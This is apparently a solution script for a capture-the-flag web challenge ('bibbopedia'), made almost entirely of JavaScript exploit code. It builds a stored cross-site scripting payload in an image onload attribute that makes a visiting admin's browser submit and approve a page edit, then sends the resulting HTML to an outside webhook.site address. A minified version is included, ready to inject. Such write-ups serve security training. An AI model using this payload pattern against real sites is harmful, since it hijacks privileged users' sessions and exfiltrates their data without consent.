// page = ```<img alt="" src="/img/gabibbo.jpg" onload="script" class="thumbimage" width=500px>```

// send the inline function to http://bibbopedia.challs.olicyber.it/edit/gabibbo in the onload argument of the img in the page to edit.

//create a new edit
fetch('http://bibbopedia.challs.olicyber.it/edit/gabibbo', {
    method: 'POST',
    body: 'page=get react /whatever',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
  })
    .then(response => response.text())
    .then(html => {

      // find target link from response
      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
  
      const links = doc.querySelectorAll('#content a');
      
      let targetLink = null;
      links.forEach(link => {
        if (link.textContent.trim() === 'qui') {
          targetLink = link.getAttribute('href');
        }
      });
      
      //accept edit from the admin
      fetch(targetLink, {
        method: 'POST',
        body: 'yes=',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      }).then(response => response.text())
      .then(html => {
        fetch('https://webhook.site/your-webhook/?answer=' + html) //replace with webhook
      });
    })
    .catch(error => console.error('Error:', error));
  
// inline: onload="(function(){fetch('http://bibbopedia.challs.olicyber.it/edit/gabibbo',{method:'POST',body:'page=get react /whatever',headers:{'Content-Type':'application/x-www-form-urlencoded'}}).then(r=>r.text()).then(h=>{const p=new DOMParser(),d=p.parseFromString(h,'text/html'),l=d.querySelectorAll('#content a');let t=null;l.forEach(a=>{if(a.textContent.trim()==='qui')t=a.getAttribute('href')});t&&fetch(t,{method:'POST',body:'yes=',headers:{'Content-Type':'application/x-www-form-urlencoded'}}).then(r=>r.text()).then(h=>fetch('https://webhook.site/your-webhook/?answer='+h))}).catch(e=>console.error('Error:',e));})()"